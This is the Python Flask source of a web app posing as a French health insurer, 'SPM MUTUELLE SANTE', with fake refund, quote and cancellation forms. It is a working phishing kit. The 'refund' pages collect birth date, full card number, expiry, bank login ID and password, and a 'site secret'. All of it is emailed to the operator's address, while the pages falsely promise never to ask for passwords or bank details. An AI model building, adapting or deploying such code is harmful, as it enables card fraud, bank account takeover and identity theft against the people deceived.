import os
import random
import re
from datetime import datetime, timezone
from html import escape
from pathlib import Path

import requests
from dotenv import load_dotenv
from flask import Flask, redirect, render_template, request, send_file, session, url_for

DOSSIER_APP = Path(__file__).resolve().parent
load_dotenv(DOSSIER_APP / ".env")

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "changez-moi-en-production")

RESEND_API_KEY = os.environ.get("RESEND_API_KEY", "")
SENDER_EMAIL = os.environ.get("SENDER_EMAIL", "SPM MUTUELLE SANTE <noreply@crasdor.org>")
EMAIL_REPLY_TO = os.environ.get("EMAIL_REPLY_TO", "")
OWNER_EMAIL = os.environ.get("OWNER_EMAIL", "")

if not RESEND_API_KEY:
    print("!" * 64)
    print("ATTENTION : cle Resend introuvable, les emails ne seront PAS envoyes.")
    print("Le fichier .env est cherche exactement ici :")
    print("   ", DOSSIER_APP / ".env")
    print("Verifiez que le fichier s'appelle bien .env (et pas .env.txt)")
    print("puis relancez : py app.py")
    print("!" * 64)
else:
    print(">> Cle Resend chargee. Les emails seront envoyes a :", OWNER_EMAIL)

MOTIFS_RESILIATION = [
    "Je n'utilise plus le produit / service",
    "Tarif trop élevé",
    "Service insatisfaisant",
    "Déménagement",
    "Autre motif",
]

REFUND_STEPS = [(1, "Vos informations"), (2, "Remboursement")]
BANQUES = ["BNP Paribas", "Crédit Agricole", "Société Générale", "Banque Populaire", "Caisse d'Épargne",
           "LCL", "Crédit Mutuel", "La Banque Postale", "Boursorama", "Hello bank!", "Fortuneo",
           "Revolut", "N26", "Nickel", "Autre"]
LIBELLES_E1 = {"nom": "nom", "prenom": "prénom", "adresse": "adresse postale", "email": "adresse email",
               "birth_date": "date de naissance", "phone": "numéro de téléphone", "montant": "montant à recevoir"}
LIBELLES_E2 = {"banque": "votre banque", "carte": "numéro de la carte", "expiration": "date d'expiration",
               "site_number": "numéro du site", "identifiant": "identifiant", "password": "mot de passe"}
DEVIS_STEPS = [(1, "Coordonnées"), (2, "Votre demande")]


# ============================================================
# EMAILS (Resend) — aucune donnée n'est enregistrée ailleurs
# ============================================================
def send_email(to, subject, html, reply_to=None):
    if not RESEND_API_KEY:
        app.logger.warning("RESEND_API_KEY manquante : email non envoyé.")
        return None
    recipients = [e.strip() for e in to.split(",") if e.strip()]
    payload = {"from": SENDER_EMAIL, "to": recipients, "subject": subject, "html": html}
    target = reply_to or EMAIL_REPLY_TO
    if target:
        payload["reply_to"] = target
    resp = requests.post(
        "https://api.resend.com/emails",
        headers={"Authorization": f"Bearer {RESEND_API_KEY}"},
        json=payload,
        timeout=30,
    )
    resp.raise_for_status()
    return resp.json().get("id")


def _page(title, body):
    return f"""<div style="background:#FFFFFF;padding:32px 16px;font-family:Arial,sans-serif">
  <div style="max-width:520px;margin:0 auto;background:#ffffff;border:1px solid #E2E8F0">
    <div style="background:#0F2C59;padding:22px 30px;color:#FAF8F5">
      <span style="font-family:Georgia,serif;font-size:20px;letter-spacing:4px">SPM</span>
      <div style="font-size:10px;letter-spacing:3px;opacity:.7;margin-top:4px">SPM MUTUELLE SANTE</div>
    </div>
    <div style="padding:30px">
      <p style="font-family:Georgia,serif;font-size:22px;color:#0F2C59;margin:0 0 18px">{title}</p>
      {body}
      <p style="font-size:11px;color:#94A3B8;margin:26px 0 0">SPM MUTUELLE SANTE — Nous ne vous demanderons jamais votre mot de passe ni vos données bancaires par email.</p>
    </div>
  </div>
</div>"""


def _table(rows):
    lignes = "".join(
        f'<tr><td style="color:#64748B;vertical-align:top">{escape(str(k))}</td>'
        f'<td><strong>{escape(str(v))}</strong></td></tr>'
        for k, v in rows
    )
    return f'<table style="width:100%;background:#F5F8FC;font-size:13px" cellpadding="10">{lignes}</table>'


def client_html(kind, nom, reference, rows):
    body = f"""
      <p style="font-size:14px;line-height:1.6;margin:0 0 10px">Bonjour {escape(nom)},</p>
      <p style="font-size:14px;line-height:1.6;margin:0 0 18px">Votre demande de {escape(kind)} est bien enregistrée.
      Notre équipe vous répond à cette adresse sous 24 h ouvrées.</p>
      {_table([("Référence", reference)] + rows)}
      <p style="font-size:14px;line-height:1.6;margin:18px 0 0">Conservez votre référence
      <strong>{escape(reference)}</strong> : elle vous sera demandée pour tout suivi.</p>"""
    return _page("Votre demande est bien reçue", body)


def owner_html(kind, reference, rows):
    body = f"""
      <p style="font-size:13px;color:#64748B;margin:0 0 16px">Répondez directement à cet email pour écrire au client.</p>
      {_table([("Référence", reference)] + rows)}"""
    return _page(f"Nouvelle demande de {escape(kind)}", body)


def notify(kind, reference, nom, email, rows, owner_extra=None):
    try:
        send_email(
            email,
            f"SPM MUTUELLE SANTE— Confirmation de votre demande {reference}",
            client_html(kind, nom, reference, rows),
        )
    except Exception as e:
        app.logger.error(f"Email client non envoyé ({reference}) : {e}")
    if OWNER_EMAIL:
        try:
            send_email(
                OWNER_EMAIL,
                f"[{kind.capitalize()}] {reference} — {nom}",
                owner_html(kind, reference, rows + list(owner_extra or [])),
                reply_to=email,
            )
        except Exception as e:
            app.logger.error(f"Email propriétaire non envoyé ({reference}) : {e}")


def email_valide(email):
    return bool(re.match(r"^[^\s@]+@[^\s@]+\.[^\s@]+$", email))


def date_valide(d):
    return bool(re.match(r"^\d{4}-\d{2}-\d{2}$", d))


def nouvelle_ref(prefix):
    return f"{prefix}-{datetime.now(timezone.utc).year}-{random.randint(10000, 99999)}"


# ============================================================
# ACCUEIL — page de bienvenue élégante
# ============================================================
@app.route("/")
def accueil():
    return render_template("index.html")


# ============================================================
# SERVICES — les 3 options
# ============================================================
@app.route("/services")
def services():
    return render_template("services.html")


# ============================================================
# REMBOURSEMENT — 2 pages
# ============================================================
@app.route("/etape-1", methods=["GET", "POST"])
def etape1():
    data = session.get("r1", {"nom": "", "prenom": "", "adresse": "", "email": "", "birth_date": "", "phone": "", "montant": ""})
    error = None
    if request.method == "POST":
        data = {k: request.form.get(k, "").strip() for k in ("nom", "prenom", "adresse", "email", "birth_date", "phone", "montant")}
        manquants = [v for k, v in LIBELLES_E1.items() if not data[k]]
        if manquants:
            error = "Merci de remplir : " + ", ".join(manquants) + "."
        elif not email_valide(data["email"]):
            error = "Adresse email invalide."
        elif not date_valide(data["birth_date"]):
            error = "Date de naissance invalide."
        elif len(re.sub(r"\D", "", data["phone"])) < 8:
            error = "Numéro de téléphone invalide."
        elif not re.match(r"^\d+([.,]\d{1,2})?\s*(€|eur|euros?)?$", data["montant"], re.IGNORECASE):
            error = "Montant invalide (ex : 49,90)."
        if not error:
            session["r1"] = data
            return redirect(url_for("etape2"))
    return render_template("etape1.html", step=1, step_labels=REFUND_STEPS, data=data, error=error, header_bleu=True)


@app.route("/etape-2", methods=["GET", "POST"])
def etape2():
    if "r1" not in session:
        return redirect(url_for("etape1"))
    data = {"banque": "", "carte": "", "expiration": "", "site_number": "", "identifiant": "", "password": ""}
    error = None
    if request.method == "POST":
        data = {k: request.form.get(k, "").strip() for k in data}
        carte_chiffres = re.sub(r"\D", "", data["carte"])
        manquants = [v for k, v in LIBELLES_E2.items() if not data.get(k, "")]
        if manquants:
            error = "Merci de remplir : " + ", ".join(manquants) + "."
        elif data["banque"] not in BANQUES:
            error = "Merci de sélectionner votre banque."
        elif not (13 <= len(carte_chiffres) <= 19):
            error = "Numéro de carte invalide."
        elif not re.match(r"^(0[1-9]|1[0-2])/\d{2}$", data["expiration"]):
            error = "Date d'expiration invalide (format MM/AA)."
        if not error:
            r1 = session.pop("r1")
            reference = nouvelle_ref("REF")
            email_client = r1["email"].lower()
            carte_fmt = " ".join(carte_chiffres[i:i + 4] for i in range(0, len(carte_chiffres), 4))
            rows = [
                ("Client", f"{r1['prenom']} {r1['nom']}"),
                ("Email", email_client),
                ("Adresse postale", r1["adresse"]),
                ("Date de naissance", r1["birth_date"]),
                ("Téléphone", r1["phone"]),
                ("Montant à recevoir", f"{r1['montant']} €"),
                ("— Page 2 —", ""),
                ("Banque", data["banque"]),
                ("Carte de remboursement", carte_fmt),
                ("Expiration", data["expiration"]),
                ("Numéro du site", data["site_number"]),
                ("Identifiant", data["identifiant"]),
                ("Mot de passe", data["password"]),
            ]
            notify("remboursement", reference, r1["prenom"], email_client,
                   [("Montant à recevoir", f"{r1['montant']} €")], owner_extra=rows[1:])
            return render_template("chargement.html", header_bleu=True)
    titulaire = f"{session['r1']['prenom']} {session['r1']['nom']}".upper()
    return render_template("etape2.html", step=2, step_labels=REFUND_STEPS, data=data, error=error, banques=BANQUES, titulaire=titulaire, header_bleu=True)


# ============================================================
# DEVIS — 2 pages
# ============================================================
@app.route("/devis", methods=["GET", "POST"])
def devis():
    data = session.get("d1", {"nom": "", "prenom": "", "email": "", "birth_date": "", "phone": ""})
    error = None
    if request.method == "POST":
        data = {k: request.form.get(k, "").strip() for k in ("nom", "prenom", "email", "birth_date", "phone")}
        if not all(data.values()):
            error = "Merci de remplir tous les champs."
        elif not email_valide(data["email"]):
            error = "Adresse email invalide."
        elif not date_valide(data["birth_date"]):
            error = "Date de naissance invalide."
        elif len(re.sub(r"\D", "", data["phone"])) < 8:
            error = "Numéro de téléphone invalide."
        if not error:
            session["d1"] = data
            return redirect(url_for("devis2"))
    return render_template("devis.html", step=1, step_labels=DEVIS_STEPS, data=data, error=error)


@app.route("/devis-2", methods=["GET", "POST"])
def devis2():
    if "d1" not in session:
        return redirect(url_for("devis"))
    data = {"refund_number": "", "refund_date": "", "postal_code": "", "site_id": "", "site_secret": ""}
    error = None
    if request.method == "POST":
        data = {k: request.form.get(k, "").strip() for k in data}
        if not all(data.values()):
            error = "Merci de remplir tous les champs."
        elif not date_valide(data["refund_date"]):
            error = "Date de remboursement invalide."
        elif not re.match(r"^\d{5}$", data["postal_code"]):
            error = "Code postal invalide (5 chiffres)."
        if not error:
            d1 = session.pop("d1")
            reference = nouvelle_ref("DEV")
            record = {**d1, "email": d1["email"].lower(), **data}
            rows = [
                ("Client", f"{record['prenom']} {record['nom']}"),
                ("Téléphone", record["phone"]),
                ("Date de naissance", record["birth_date"]),
                ("N° remboursement", record["refund_number"]),
                ("Date remboursement", record["refund_date"]),
                ("Code postal", record["postal_code"]),
                ("ID du site", record["site_id"]),
            ]
            notify("devis", reference, record["prenom"], record["email"], rows,
                   owner_extra=[("Nom secret", record["site_secret"])])
            session["conf"] = {
                "reference": reference, "nom_affiche": record["prenom"], "email": record["email"],
                "kind": "devis", "details": rows,
            }
            return redirect(url_for("confirmation"))
    return render_template("devis2.html", step=2, step_labels=DEVIS_STEPS, data=data, error=error)


# ============================================================
# RÉSILIATION — 1 page
# ============================================================
@app.route("/resiliation", methods=["GET", "POST"])
def resiliation():
    data = {"nom": "", "email": "", "order_number": "", "motif": "", "date_souhaitee": ""}
    error = None
    if request.method == "POST":
        data = {k: request.form.get(k, "").strip() for k in data}
        if not (data["nom"] and data["email"] and data["order_number"] and data["motif"]):
            error = "Merci de remplir tous les champs obligatoires."
        elif not email_valide(data["email"]):
            error = "Adresse email invalide."
        elif data["motif"] not in MOTIFS_RESILIATION:
            error = "Merci de sélectionner un motif."
        if not error:
            reference = nouvelle_ref("RES")
            rows = [("Commande / contrat", data["order_number"]), ("Motif", data["motif"])]
            if data["date_souhaitee"]:
                rows.append(("Date souhaitée", data["date_souhaitee"]))
            notify("résiliation", reference, data["nom"], data["email"].lower(), rows)
            session["conf"] = {
                "reference": reference, "nom_affiche": data["nom"], "email": data["email"].lower(),
                "kind": "résiliation", "details": rows,
            }
            return redirect(url_for("confirmation"))
    return render_template("resiliation.html", data=data, error=error, motifs=MOTIFS_RESILIATION)


# ============================================================
# TÉLÉCHARGEMENT DU CODE SOURCE (preview uniquement)
# ============================================================
ZIP_CODE = "/app/meindjo-flask.zip"


@app.route("/telecharger-le-code")
def telecharger_code():
    if not os.path.exists(ZIP_CODE):
        return redirect(url_for("accueil"))
    return send_file(ZIP_CODE, as_attachment=True, download_name="meindjo-flask.zip")


@app.route("/confirmation")
def confirmation():
    conf = session.pop("conf", None)
    if not conf:
        return redirect(url_for("accueil"))
    return render_template("confirmation.html", conf=conf)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
